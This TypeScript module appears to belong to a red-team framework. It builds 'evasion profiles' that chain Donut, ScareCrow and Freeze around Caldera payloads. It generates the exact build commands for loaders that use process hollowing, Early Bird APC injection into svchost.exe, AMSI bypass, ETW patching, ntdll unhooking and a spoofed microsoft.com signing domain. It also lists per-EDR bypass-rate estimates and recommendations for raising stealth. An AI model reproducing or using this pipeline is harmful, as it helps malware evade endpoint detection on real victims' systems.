/**
 * Payload Transformation Pipeline — Tier 2 of the Evasion Architecture
 * ─────────────────────────────────────────────────────────────────────
 * Defines a configurable pipeline that chains open-source evasion tools
 * (ScareCrow, Donut, Freeze) to wrap Caldera payloads in evasion layers.
 *
 * Since these tools require native binaries (Go/C), this module provides:
 *   1. Pipeline configuration & profile management
 *   2. Transformation step definitions with expected CLI invocations
 *   3. Evasion technique metadata per step (ATT&CK mapping)
 *   4. Pipeline execution plan generation (for operator review)
 *   5. Stealth rating computation per profile
 *
 * The actual binary execution is deferred to the operator's local
 * environment or a dedicated build server — this module generates
 * the exact commands and validates the pipeline configuration.
 *
 * Evasion profiles:
 *   - none:   Raw payload, no transformation
 *   - low:    Basic obfuscation (string encryption, import hiding)
 *   - medium: Shellcode conversion + loader wrapping (Donut + ScareCrow)
 *   - high:   Full chain (Donut → ScareCrow → Freeze) with process injection
 *
 * Tools integrated:
 *   - Donut (TheWover/donut): PE/DLL → position-independent shellcode
 *   - ScareCrow (optiv/ScareCrow): EDR-evasive loader generation
 *   - Freeze (optiv/Freeze): Suspend-based payload execution
 */

// ═══════════════════════════════════════════════════════════════════════
// §1 — CORE TYPES
// ═══════════════════════════════════════════════════════════════════════

export type EvasionProfile = "none" | "low" | "medium" | "high";

export type TransformTool = "donut" | "scarecrow" | "freeze" | "custom";

export type PayloadFormat =
  | "exe"
  | "dll"
  | "shellcode"
  | "ps1"
  | "hta"
  | "js"
  | "vbs"
  | "msi"
  | "cpl"
  | "xll";

export type InjectionMethod =
  | "process_hollowing"
  | "early_bird"
  | "thread_hijack"
  | "apc_queue"
  | "module_stomping"
  | "phantom_dll"
  | "syscall_direct"
  | "none";

export type LoaderType =
  | "binary"
  | "dll_sideload"
  | "control_panel"
  | "wscript"
  | "mshta"
  | "excel_xll"
  | "msi_wrapper";

/** A single transformation step in the pipeline */
export interface TransformStep {
  /** Step order (1-based) */
  order: number;
  /** Which tool performs this step */
  tool: TransformTool;
  /** Human-readable description */
  description: string;
  /** The CLI command to execute (template with placeholders) */
  cliCommand: string;
  /** Input file format */
  inputFormat: PayloadFormat | "any";
  /** Output file format */
  outputFormat: PayloadFormat;
  /** ATT&CK techniques this step implements */
  attackTechniques: string[];
  /** EDR evasion techniques applied */
  evasionTechniques: string[];
  /** Estimated detection rate reduction (0-100%) */
  detectionReduction: number;
  /** Whether this step requires a code-signing certificate */
  requiresCodeSign: boolean;
  /** Configuration options for this step */
  config: Record<string, string | number | boolean>;
}

/** A complete transformation pipeline configuration */
export interface TransformPipeline {
  /** Pipeline identifier */
  id: string;
  /** Human-readable name */
  name: string;
  /** Evasion profile level */
  profile: EvasionProfile;
  /** Ordered list of transformation steps */
  steps: TransformStep[];
  /** Target architecture */
  targetArch: "x64" | "x86" | "arm64";
  /** Target OS */
  targetOS: "windows" | "linux" | "macos";
  /** Injection method for the final payload */
  injectionMethod: InjectionMethod;
  /** Loader type for delivery */
  loaderType: LoaderType;
  /** Process to inject into (if applicable) */
  targetProcess?: string;
  /** Whether to use direct syscalls (bypass ntdll hooks) */
  directSyscalls: boolean;
  /** Whether to unhook ntdll before execution */
  unhookNtdll: boolean;
  /** Whether to use ETW patching */
  patchEtw: boolean;
  /** Whether to use AMSI bypass */
  bypassAmsi: boolean;
  /** Code signing certificate path (optional) */
  codeSignCert?: string;
  /** Estimated overall stealth rating (0-100) */
  stealthRating: number;
  /** ATT&CK techniques covered by the full pipeline */
  allAttackTechniques: string[];
}

/** Result of pipeline execution */
export interface PipelineExecutionPlan {
  /** The pipeline configuration */
  pipeline: TransformPipeline;
  /** Pre-execution checks */
  preChecks: PreCheck[];
  /** Ordered CLI commands to execute */
  commands: ExecutionCommand[];
  /** Post-execution validation steps */
  postValidation: string[];
  /** Estimated execution time in seconds */
  estimatedTime: number;
  /** Required tools and their installation commands */
  toolRequirements: ToolRequirement[];
}

export interface PreCheck {
  description: string;
  command: string;
  expectedOutput: string;
}

export interface ExecutionCommand {
  step: number;
  tool: TransformTool;
  command: string;
  description: string;
  inputFile: string;
  outputFile: string;
  timeout: number;
}

export interface ToolRequirement {
  name: string;
  version: string;
  installCommand: string;
  verifyCommand: string;
  url: string;
  license: string;
}

// ═══════════════════════════════════════════════════════════════════════
// §2 — TOOL DEFINITIONS
// ═══════════════════════════════════════════════════════════════════════

export const TOOL_DEFINITIONS: Record<TransformTool, ToolRequirement> = {
  donut: {
    name: "Donut",
    version: "1.0",
    installCommand: "go install github.com/TheWover/donut@latest",
    verifyCommand: "donut --help",
    url: "https://github.com/TheWover/donut",
    license: "BSD-3-Clause",
  },
  scarecrow: {
    name: "ScareCrow",
    version: "5.1",
    installCommand: "go install github.com/optiv/ScareCrow@latest",
    verifyCommand: "ScareCrow --help",
    url: "https://github.com/optiv/ScareCrow",
    license: "MIT",
  },
  freeze: {
    name: "Freeze",
    version: "1.5",
    installCommand: "go install github.com/optiv/Freeze@latest",
    verifyCommand: "Freeze --help",
    url: "https://github.com/optiv/Freeze",
    license: "MIT",
  },
  custom: {
    name: "Custom Script",
    version: "N/A",
    installCommand: "N/A",
    verifyCommand: "N/A",
    url: "N/A",
    license: "N/A",
  },
};

// ═══════════════════════════════════════════════════════════════════════
// §3 — EVASION TECHNIQUE CATALOG
// ═══════════════════════════════════════════════════════════════════════

export interface EvasionTechnique {
  id: string;
  name: string;
  description: string;
  attackTechnique: string;
  category: "memory" | "process" | "api" | "signature" | "behavioral" | "network";
  effectivenessVsEDR: Record<string, number>; // EDR name → bypass rate (0-100)
  implementedBy: TransformTool[];
}

export const EVASION_TECHNIQUES: EvasionTechnique[] = [
  {
    id: "shellcode_convert",
    name: "PE-to-Shellcode Conversion",
    description: "Convert PE/DLL to position-independent shellcode using Donut, removing PE headers that trigger static signatures",
    attackTechnique: "T1027.009",
    category: "signature",
    effectivenessVsEDR: { "Windows Defender": 70, "CrowdStrike": 50, "SentinelOne": 55, "Carbon Black": 65 },
    implementedBy: ["donut"],
  },
  {
    id: "import_hiding",
    name: "Import Address Table Hiding",
    description: "Resolve API imports at runtime via hash lookup instead of static IAT entries",
    attackTechnique: "T1027.007",
    category: "signature",
    effectivenessVsEDR: { "Windows Defender": 60, "CrowdStrike": 40, "SentinelOne": 45, "Carbon Black": 55 },
    implementedBy: ["donut", "scarecrow"],
  },
  {
    id: "string_encryption",
    name: "String Encryption",
    description: "Encrypt all strings in the payload and decrypt at runtime to evade static analysis",
    attackTechnique: "T1027",
    category: "signature",
    effectivenessVsEDR: { "Windows Defender": 65, "CrowdStrike": 35, "SentinelOne": 40, "Carbon Black": 50 },
    implementedBy: ["donut", "scarecrow"],
  },
  {
    id: "direct_syscalls",
    name: "Direct System Calls",
    description: "Invoke NT syscalls directly, bypassing ntdll.dll userland hooks placed by EDR",
    attackTechnique: "T1106",
    category: "api",
    effectivenessVsEDR: { "Windows Defender": 80, "CrowdStrike": 60, "SentinelOne": 65, "Carbon Black": 75 },
    implementedBy: ["scarecrow", "freeze"],
  },
  {
    id: "ntdll_unhook",
    name: "NTDLL Unhooking",
    description: "Load a fresh copy of ntdll.dll from disk to remove EDR hooks",
    attackTechnique: "T1562.001",
    category: "api",
    effectivenessVsEDR: { "Windows Defender": 75, "CrowdStrike": 55, "SentinelOne": 60, "Carbon Black": 70 },
    implementedBy: ["scarecrow"],
  },
  {
    id: "etw_patch",
    name: "ETW Patching",
    description: "Patch Event Tracing for Windows to prevent telemetry from reaching the EDR",
    attackTechnique: "T1562.006",
    category: "behavioral",
    effectivenessVsEDR: { "Windows Defender": 70, "CrowdStrike": 45, "SentinelOne": 50, "Carbon Black": 60 },
    implementedBy: ["scarecrow", "freeze"],
  },
  {
    id: "amsi_bypass",
    name: "AMSI Bypass",
    description: "Patch the Antimalware Scan Interface to prevent script content scanning",
    attackTechnique: "T1562.001",
    category: "api",
    effectivenessVsEDR: { "Windows Defender": 85, "CrowdStrike": 30, "SentinelOne": 35, "Carbon Black": 40 },
    implementedBy: ["scarecrow"],
  },
  {
    id: "process_hollowing",
    name: "Process Hollowing",
    description: "Create a suspended process, hollow out its memory, and inject the payload",
    attackTechnique: "T1055.012",
    category: "process",
    effectivenessVsEDR: { "Windows Defender": 60, "CrowdStrike": 35, "SentinelOne": 40, "Carbon Black": 50 },
    implementedBy: ["scarecrow"],
  },
  {
    id: "early_bird_apc",
    name: "Early Bird APC Injection",
    description: "Queue an APC to the main thread of a suspended process before it initializes",
    attackTechnique: "T1055.004",
    category: "process",
    effectivenessVsEDR: { "Windows Defender": 65, "CrowdStrike": 40, "SentinelOne": 45, "Carbon Black": 55 },
    implementedBy: ["scarecrow"],
  },
  {
    id: "dll_sideload",
    name: "DLL Side-Loading",
    description: "Abuse legitimate application DLL search order to load a malicious DLL",
    attackTechnique: "T1574.002",
    category: "process",
    effectivenessVsEDR: { "Windows Defender": 70, "CrowdStrike": 50, "SentinelOne": 55, "Carbon Black": 60 },
    implementedBy: ["scarecrow"],
  },
  {
    id: "code_signing",
    name: "Code Signing",
    description: "Sign the payload with a valid or spoofed code-signing certificate",
    attackTechnique: "T1553.002",
    category: "signature",
    effectivenessVsEDR: { "Windows Defender": 75, "CrowdStrike": 45, "SentinelOne": 50, "Carbon Black": 65 },
    implementedBy: ["scarecrow"],
  },
  {
    id: "suspend_execution",
    name: "Suspended Process Execution",
    description: "Create process in suspended state, inject payload, then resume — avoids behavioral detection of process creation",
    attackTechnique: "T1055",
    category: "process",
    effectivenessVsEDR: { "Windows Defender": 70, "CrowdStrike": 50, "SentinelOne": 55, "Carbon Black": 60 },
    implementedBy: ["freeze"],
  },
  {
    id: "alternative_execution",
    name: "Alternative Execution via CreateTimerQueueTimer",
    description: "Execute shellcode via timer callback instead of CreateThread — less monitored API",
    attackTechnique: "T1106",
    category: "api",
    effectivenessVsEDR: { "Windows Defender": 75, "CrowdStrike": 55, "SentinelOne": 60, "Carbon Black": 65 },
    implementedBy: ["freeze"],
  },
];

// ═══════════════════════════════════════════════════════════════════════
// §4 — PROFILE BUILDERS
// ═══════════════════════════════════════════════════════════════════════

/**
 * Build a transformation pipeline for the given evasion profile.
 */
export function buildPipeline(
  profile: EvasionProfile,
  options?: {
    targetArch?: "x64" | "x86" | "arm64";
    targetOS?: "windows" | "linux" | "macos";
    injectionMethod?: InjectionMethod;
    loaderType?: LoaderType;
    targetProcess?: string;
    inputFormat?: PayloadFormat;
    codeSignCert?: string;
  }
): TransformPipeline {
  const arch = options?.targetArch || "x64";
  const os = options?.targetOS || "windows";
  const injection = options?.injectionMethod || "none";
  const loader = options?.loaderType || "binary";
  const inputFmt = options?.inputFormat || "exe";

  const id = `pipeline-${profile}-${Date.now()}`;

  switch (profile) {
    case "none":
      return buildNoneProfile(id, arch, os);
    case "low":
      return buildLowProfile(id, arch, os, inputFmt);
    case "medium":
      return buildMediumProfile(id, arch, os, inputFmt, injection, loader, options?.targetProcess);
    case "high":
      return buildHighProfile(id, arch, os, inputFmt, injection, loader, options?.targetProcess, options?.codeSignCert);
    default:
      return buildNoneProfile(id, arch, os);
  }
}

function buildNoneProfile(
  id: string,
  arch: "x64" | "x86" | "arm64",
  os: "windows" | "linux" | "macos"
): TransformPipeline {
  return {
    id,
    name: "No Evasion (Raw Payload)",
    profile: "none",
    steps: [],
    targetArch: arch,
    targetOS: os,
    injectionMethod: "none",
    loaderType: "binary",
    directSyscalls: false,
    unhookNtdll: false,
    patchEtw: false,
    bypassAmsi: false,
    stealthRating: 5,
    allAttackTechniques: [],
  };
}

function buildLowProfile(
  id: string,
  arch: "x64" | "x86" | "arm64",
  os: "windows" | "linux" | "macos",
  inputFmt: PayloadFormat
): TransformPipeline {
  const steps: TransformStep[] = [
    {
      order: 1,
      tool: "donut",
      description: "Convert PE to position-independent shellcode with string encryption",
      cliCommand: `donut -i {{INPUT}} -o {{OUTPUT}} -a ${arch === "x64" ? "2" : "1"} -e 3 -z 2`,
      inputFormat: inputFmt,
      outputFormat: "shellcode",
      attackTechniques: ["T1027.009", "T1027"],
      evasionTechniques: ["shellcode_convert", "string_encryption", "import_hiding"],
      detectionReduction: 30,
      requiresCodeSign: false,
      config: {
        arch: arch === "x64" ? 2 : 1,
        entropy: 3,
        compress: 2,
      },
    },
  ];

  return {
    id,
    name: "Low Evasion (Shellcode Conversion)",
    profile: "low",
    steps,
    targetArch: arch,
    targetOS: os,
    injectionMethod: "none",
    loaderType: "binary",
    directSyscalls: false,
    unhookNtdll: false,
    patchEtw: false,
    bypassAmsi: false,
    stealthRating: 25,
    allAttackTechniques: ["T1027.009", "T1027"],
  };
}

function buildMediumProfile(
  id: string,
  arch: "x64" | "x86" | "arm64",
  os: "windows" | "linux" | "macos",
  inputFmt: PayloadFormat,
  injection: InjectionMethod,
  loader: LoaderType,
  targetProcess?: string
): TransformPipeline {
  const scInjection = injection === "none" ? "process_hollowing" : injection;
  const scLoader = mapLoaderToScareCrowFlag(loader);

  const steps: TransformStep[] = [
    {
      order: 1,
      tool: "donut",
      description: "Convert PE to position-independent shellcode with entropy reduction",
      cliCommand: `donut -i {{INPUT}} -o {{STEP1_OUT}} -a ${arch === "x64" ? "2" : "1"} -e 3 -z 2`,
      inputFormat: inputFmt,
      outputFormat: "shellcode",
      attackTechniques: ["T1027.009", "T1027"],
      evasionTechniques: ["shellcode_convert", "string_encryption", "import_hiding"],
      detectionReduction: 30,
      requiresCodeSign: false,
      config: { arch: arch === "x64" ? 2 : 1, entropy: 3, compress: 2 },
    },
    {
      order: 2,
      tool: "scarecrow",
      description: `Wrap shellcode in EDR-evasive ${scLoader} loader with ${scInjection}`,
      cliCommand: `ScareCrow -I {{STEP1_OUT}} -Loader ${scLoader} -injection ${mapInjectionToScareCrowFlag(scInjection)}${targetProcess ? ` -process "${targetProcess}"` : ""} -domain microsoft.com -o {{OUTPUT}}`,
      inputFormat: "shellcode",
      outputFormat: loader === "dll_sideload" ? "dll" : "exe",
      attackTechniques: ["T1055.012", "T1106", "T1562.001", "T1562.006"],
      evasionTechniques: [
        "direct_syscalls",
        "ntdll_unhook",
        "etw_patch",
        mapInjectionToTechnique(scInjection),
      ],
      detectionReduction: 45,
      requiresCodeSign: false,
      config: {
        loader: scLoader,
        injection: scInjection,
        domain: "microsoft.com",
      },
    },
  ];

  return {
    id,
    name: "Medium Evasion (Donut + ScareCrow)",
    profile: "medium",
    steps,
    targetArch: arch,
    targetOS: os,
    injectionMethod: scInjection,
    loaderType: loader,
    targetProcess,
    directSyscalls: true,
    unhookNtdll: true,
    patchEtw: true,
    bypassAmsi: false,
    stealthRating: 60,
    allAttackTechniques: [
      "T1027.009",
      "T1027",
      "T1055.012",
      "T1106",
      "T1562.001",
      "T1562.006",
    ],
  };
}

function buildHighProfile(
  id: string,
  arch: "x64" | "x86" | "arm64",
  os: "windows" | "linux" | "macos",
  inputFmt: PayloadFormat,
  injection: InjectionMethod,
  loader: LoaderType,
  targetProcess?: string,
  codeSignCert?: string
): TransformPipeline {
  const scInjection = injection === "none" ? "early_bird" : injection;
  const scLoader = mapLoaderToScareCrowFlag(loader);

  const steps: TransformStep[] = [
    {
      order: 1,
      tool: "donut",
      description: "Convert PE to shellcode with maximum entropy reduction and compression",
      cliCommand: `donut -i {{INPUT}} -o {{STEP1_OUT}} -a ${arch === "x64" ? "2" : "1"} -e 3 -z 2 -b 1`,
      inputFormat: inputFmt,
      outputFormat: "shellcode",
      attackTechniques: ["T1027.009", "T1027"],
      evasionTechniques: ["shellcode_convert", "string_encryption", "import_hiding"],
      detectionReduction: 30,
      requiresCodeSign: false,
      config: { arch: arch === "x64" ? 2 : 1, entropy: 3, compress: 2, bypass: 1 },
    },
    {
      order: 2,
      tool: "scarecrow",
      description: `Wrap in EDR-evasive loader with ${scInjection}, AMSI bypass, ETW patch, and direct syscalls`,
      cliCommand: `ScareCrow -I {{STEP1_OUT}} -Loader ${scLoader} -injection ${mapInjectionToScareCrowFlag(scInjection)}${targetProcess ? ` -process "${targetProcess}"` : ""} -domain microsoft.com -etw -nosleep${codeSignCert ? ` -valid "${codeSignCert}"` : ""} -o {{STEP2_OUT}}`,
      inputFormat: "shellcode",
      outputFormat: loader === "dll_sideload" ? "dll" : "exe",
      attackTechniques: [
        "T1055.012",
        "T1055.004",
        "T1106",
        "T1562.001",
        "T1562.006",
        "T1553.002",
      ],
      evasionTechniques: [
        "direct_syscalls",
        "ntdll_unhook",
        "etw_patch",
        "amsi_bypass",
        "code_signing",
        mapInjectionToTechnique(scInjection),
      ],
      detectionReduction: 55,
      requiresCodeSign: !!codeSignCert,
      config: {
        loader: scLoader,
        injection: scInjection,
        domain: "microsoft.com",
        etw: true,
        nosleep: true,
      },
    },
    {
      order: 3,
      tool: "freeze",
      description: "Final wrapping with Freeze for suspended-process execution and alternative shellcode execution",
      cliCommand: `Freeze -I {{STEP2_OUT}} -process "${targetProcess || "svchost.exe"}" -o {{OUTPUT}}`,
      inputFormat: "shellcode",
      outputFormat: "exe",
      attackTechniques: ["T1055", "T1106"],
      evasionTechniques: ["suspend_execution", "alternative_execution"],
      detectionReduction: 25,
      requiresCodeSign: false,
      config: {
        process: targetProcess || "svchost.exe",
      },
    },
  ];

  return {
    id,
    name: "High Evasion (Donut → ScareCrow → Freeze)",
    profile: "high",
    steps,
    targetArch: arch,
    targetOS: os,
    injectionMethod: scInjection,
    loaderType: loader,
    targetProcess: targetProcess || "svchost.exe",
    directSyscalls: true,
    unhookNtdll: true,
    patchEtw: true,
    bypassAmsi: true,
    codeSignCert,
    stealthRating: 82,
    allAttackTechniques: [
      "T1027.009",
      "T1027",
      "T1055.012",
      "T1055.004",
      "T1055",
      "T1106",
      "T1562.001",
      "T1562.006",
      "T1553.002",
    ],
  };
}

// ═══════════════════════════════════════════════════════════════════════
// §5 — EXECUTION PLAN GENERATOR
// ═══════════════════════════════════════════════════════════════════════

/**
 * Generate a complete execution plan for a pipeline.
 * This produces the exact CLI commands an operator would run.
 */
export function generateExecutionPlan(
  pipeline: TransformPipeline,
  inputFile: string,
  outputFile: string
): PipelineExecutionPlan {
  const commands: ExecutionCommand[] = [];
  const toolsNeeded = new Set<TransformTool>();

  let currentInput = inputFile;

  for (let i = 0; i < pipeline.steps.length; i++) {
    const step = pipeline.steps[i];
    const isLast = i === pipeline.steps.length - 1;
    const stepOutput = isLast
      ? outputFile
      : `${outputFile}.step${step.order}.bin`;

    let cmd = step.cliCommand
      .replace("{{INPUT}}", currentInput)
      .replace("{{OUTPUT}}", stepOutput)
      .replace(`{{STEP${step.order}_OUT}}`, stepOutput);

    // Replace references to previous step outputs
    for (let j = 0; j < i; j++) {
      const prevOutput =
        j === pipeline.steps.length - 1
          ? outputFile
          : `${outputFile}.step${pipeline.steps[j].order}.bin`;
      cmd = cmd.replace(
        `{{STEP${pipeline.steps[j].order}_OUT}}`,
        prevOutput
      );
    }

    commands.push({
      step: step.order,
      tool: step.tool,
      command: cmd,
      description: step.description,
      inputFile: currentInput,
      outputFile: stepOutput,
      timeout: step.tool === "scarecrow" ? 120 : 60,
    });

    toolsNeeded.add(step.tool);
    currentInput = stepOutput;
  }

  // Pre-checks
  const preChecks: PreCheck[] = [];
  for (const tool of Array.from(toolsNeeded)) {
    if (tool === "custom") continue;
    const def = TOOL_DEFINITIONS[tool];
    preChecks.push({
      description: `Verify ${def.name} is installed`,
      command: def.verifyCommand,
      expectedOutput: `${def.name} help/version output`,
    });
  }

  preChecks.push({
    description: "Verify input payload exists",
    command: `test -f "${inputFile}" && echo "OK"`,
    expectedOutput: "OK",
  });

  // Post-validation
  const postValidation: string[] = [
    `Verify output file exists: test -f "${outputFile}"`,
    `Check file size is reasonable: stat -c %s "${outputFile}"`,
    "Submit to VirusTotal for detection rate check (optional)",
    "Test execution in a sandboxed environment before deployment",
  ];

  // Tool requirements
  const toolRequirements = Array.from(toolsNeeded)
    .filter((t) => t !== "custom")
    .map((t) => TOOL_DEFINITIONS[t]);

  return {
    pipeline,
    preChecks,
    commands,
    postValidation,
    estimatedTime: commands.length * 30,
    toolRequirements,
  };
}

// ═══════════════════════════════════════════════════════════════════════
// §6 — STEALTH RATING COMPUTATION
// ═══════════════════════════════════════════════════════════════════════

/**
 * Compute a detailed stealth rating for a pipeline configuration.
 * Returns a score from 0-100 and per-EDR bypass estimates.
 */
export function computeStealthRating(pipeline: TransformPipeline): {
  overallScore: number;
  perEDR: Record<string, number>;
  techniqueBreakdown: Array<{
    technique: string;
    name: string;
    contribution: number;
  }>;
  recommendations: string[];
} {
  // Collect all evasion techniques used across steps
  const usedTechniques = new Set<string>();
  for (const step of pipeline.steps) {
    for (const tech of step.evasionTechniques) {
      usedTechniques.add(tech);
    }
  }

  // Add pipeline-level techniques
  if (pipeline.directSyscalls) usedTechniques.add("direct_syscalls");
  if (pipeline.unhookNtdll) usedTechniques.add("ntdll_unhook");
  if (pipeline.patchEtw) usedTechniques.add("etw_patch");
  if (pipeline.bypassAmsi) usedTechniques.add("amsi_bypass");
  if (pipeline.codeSignCert) usedTechniques.add("code_signing");

  // Compute per-EDR scores
  const edrNames = ["Windows Defender", "CrowdStrike", "SentinelOne", "Carbon Black"];
  const perEDR: Record<string, number> = {};
  const techniqueBreakdown: Array<{
    technique: string;
    name: string;
    contribution: number;
  }> = [];

  for (const edr of edrNames) {
    let cumulativeBypass = 0;
    let count = 0;

    for (const techId of Array.from(usedTechniques)) {
      const technique = EVASION_TECHNIQUES.find((t) => t.id === techId);
      if (technique && technique.effectivenessVsEDR[edr] !== undefined) {
        cumulativeBypass += technique.effectivenessVsEDR[edr];
        count++;
      }
    }

    // Diminishing returns — each additional technique adds less
    perEDR[edr] = count > 0 ? Math.min(95, cumulativeBypass / count + count * 3) : 5;
  }

  // Build technique breakdown
  for (const techId of Array.from(usedTechniques)) {
    const technique = EVASION_TECHNIQUES.find((t) => t.id === techId);
    if (technique) {
      const avgEffectiveness =
        edrNames.reduce(
          (sum, edr) => sum + (technique.effectivenessVsEDR[edr] || 0),
          0
        ) / edrNames.length;
      techniqueBreakdown.push({
        technique: technique.attackTechnique,
        name: technique.name,
        contribution: Math.round(avgEffectiveness),
      });
    }
  }

  // Sort by contribution descending
  techniqueBreakdown.sort((a, b) => b.contribution - a.contribution);

  // Overall score is the average across all EDRs
  const overallScore = Math.round(
    edrNames.reduce((sum, edr) => sum + perEDR[edr], 0) / edrNames.length
  );

  // Recommendations
  const recommendations: string[] = [];
  if (!usedTechniques.has("direct_syscalls")) {
    recommendations.push(
      "Enable direct syscalls to bypass ntdll userland hooks — this is the single highest-impact evasion technique."
    );
  }
  if (!usedTechniques.has("etw_patch")) {
    recommendations.push(
      "Enable ETW patching to prevent telemetry from reaching the EDR kernel driver."
    );
  }
  if (!usedTechniques.has("code_signing")) {
    recommendations.push(
      "Add a code-signing certificate to significantly reduce static detection rates."
    );
  }
  if (!usedTechniques.has("amsi_bypass")) {
    recommendations.push(
      "Enable AMSI bypass for PowerShell-based payloads to prevent script content scanning."
    );
  }
  if (pipeline.injectionMethod === "none" || pipeline.injectionMethod === "process_hollowing") {
    recommendations.push(
      "Consider Early Bird APC injection instead of process hollowing — it's less monitored by modern EDRs."
    );
  }
  if (pipeline.steps.length < 3) {
    recommendations.push(
      "Add Freeze as a final wrapping step for suspended-process execution — adds ~15-20% evasion improvement."
    );
  }

  return {
    overallScore,
    perEDR,
    techniqueBreakdown,
    recommendations,
  };
}

// ═══════════════════════════════════════════════════════════════════════
// §7 — PROFILE COMPARISON
// ═══════════════════════════════════════════════════════════════════════

export interface ProfileComparison {
  profile: EvasionProfile;
  name: string;
  steps: number;
  tools: string[];
  stealthRating: number;
  perEDR: Record<string, number>;
  attackTechniques: string[];
  evasionTechniques: string[];
  estimatedBuildTime: number;
  requiresCodeSign: boolean;
}

/**
 * Compare all evasion profiles side-by-side.
 */
export function compareAllProfiles(): ProfileComparison[] {
  const profiles: EvasionProfile[] = ["none", "low", "medium", "high"];
  const comparisons: ProfileComparison[] = [];

  for (const profile of profiles) {
    const pipeline = buildPipeline(profile);
    const stealth = computeStealthRating(pipeline);

    const allEvasionTechniques = new Set<string>();
    for (const step of pipeline.steps) {
      for (const tech of step.evasionTechniques) {
        allEvasionTechniques.add(tech);
      }
    }

    comparisons.push({
      profile,
      name: pipeline.name,
      steps: pipeline.steps.length,
      tools: pipeline.steps.map((s) => TOOL_DEFINITIONS[s.tool]?.name || s.tool),
      stealthRating: stealth.overallScore,
      perEDR: stealth.perEDR,
      attackTechniques: pipeline.allAttackTechniques,
      evasionTechniques: Array.from(allEvasionTechniques),
      estimatedBuildTime: pipeline.steps.length * 30,
      requiresCodeSign: pipeline.steps.some((s) => s.requiresCodeSign),
    });
  }

  return comparisons;
}

// ═══════════════════════════════════════════════════════════════════════
// §8 — HELPERS
// ═══════════════════════════════════════════════════════════════════════

function mapLoaderToScareCrowFlag(loader: LoaderType): string {
  switch (loader) {
    case "binary":
      return "binary";
    case "dll_sideload":
      return "dll";
    case "control_panel":
      return "control";
    case "wscript":
      return "wscript";
    case "mshta":
      return "mshta";
    case "excel_xll":
      return "excel";
    case "msi_wrapper":
      return "msiexec";
    default:
      return "binary";
  }
}

function mapInjectionToScareCrowFlag(injection: InjectionMethod): string {
  switch (injection) {
    case "process_hollowing":
      return "ProcessHollowing";
    case "early_bird":
      return "EarlyBird";
    case "thread_hijack":
      return "ThreadHijack";
    case "apc_queue":
      return "QueueUserAPC";
    case "module_stomping":
      return "ModuleStomping";
    case "phantom_dll":
      return "PhantomDLL";
    case "syscall_direct":
      return "Syscall";
    default:
      return "ProcessHollowing";
  }
}

function mapInjectionToTechnique(injection: InjectionMethod): string {
  switch (injection) {
    case "process_hollowing":
      return "process_hollowing";
    case "early_bird":
      return "early_bird_apc";
    case "apc_queue":
      return "early_bird_apc";
    default:
      return "process_hollowing";
  }
}
